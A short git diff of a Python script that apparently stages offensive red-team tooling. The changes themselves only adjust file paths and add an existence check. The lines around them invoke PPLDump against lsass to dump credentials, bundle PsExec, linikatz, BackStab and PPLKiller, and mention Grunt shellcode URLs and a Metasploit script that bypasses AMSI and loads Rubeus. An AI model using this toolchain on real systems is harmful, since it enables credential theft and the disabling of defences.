@@ -469,8 +469,8 @@ for huan_exe in glob.glob('./artifact/*.exe'):
 # Map Failed when using Invoke-RPEI
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='raw')
 #c_exe('PPLDump-NoArgs.exe', 'PPLDump.exe lsass lsass.dmp', _type='enc')
-simple('../PPLDump.exe', 'PPLDump.exe')
-simple('../SysinternalsSuite/PsExec.exe', 'PsExec.exe')
+simple('PPLDump.exe', 'PPLDump.exe')
+simple('SysinternalsSuite_PsExec.exe', 'PsExec.exe')
 simple('linikatz.sh')
 simple('BackStab.exe')
 simple('PPLKiller.exe')
@@ -532,7 +532,7 @@ if args.chome:
     pandora('vb-1', shellUrl=shellcode_url_grunt, desc='Grunt')
 
 # metasploit custom meterpreter script
-if args.msf_workdir:
+if args.msf_workdir and os.path.exists(args.msf_workdir):
     # put noAmsi, Rubeus into win_getTGT.rc
     # maybe. Load amsibypass, Load Rubeus, EXEC Rubeus?
     # ref: /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/powershell.rb
